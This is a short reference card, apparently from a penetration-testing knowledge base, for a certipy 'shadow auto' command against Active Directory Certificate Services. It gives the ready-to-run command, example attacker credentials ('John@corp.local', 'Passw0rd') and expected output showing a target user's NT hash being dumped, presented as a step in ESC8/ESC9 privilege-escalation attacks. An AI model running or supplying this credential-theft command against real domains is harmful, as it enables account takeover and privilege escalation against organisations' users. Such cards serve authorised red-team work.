---
type: command
executor: bash
data: >-
  certipy shadow auto -username $_USERNAME -p $_PASSWORD -account
  $_TARGET_ACCOUNT
output: null
platforms:
  - Linux
  - Windows
  - Active Directory
tags:
  - credential-access
  - adcs
verified: true
validated: true
---

# certipy-shadow-auto-retrieve-hash

## Command

```bash
certipy shadow auto -username $_USERNAME -p $_PASSWORD -account $_TARGET_ACCOUNT
```

## Description

Automates adding a shadow credential to a target AD user and retrieves their NT hash via certificate authentication. Used in ESC8/ESC9 attacks to bootstrap privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -username $_USERNAME | Attacker's username for authentication (e.g., John@corp.local) | Yes |
| -p $_PASSWORD | Attacker's password | Yes |
| -account $_TARGET_ACCOUNT | Target user to add credential to (e.g., Jane) | Yes |

## Examples

### Basic Usage

```bash
certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
```

### Advanced Usage

```bash
certipy shadow auto -username John@corp.local -p Passw0rd -account Jane -debug
```

## Expected Output

Certificate requested and NT hash dumped, e.g.:

Target: Jane
NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

## Related

- [[procedures/Active-Directory-Certificate-Services-ESC9-Attack]]
- [[tools/Certipy]]
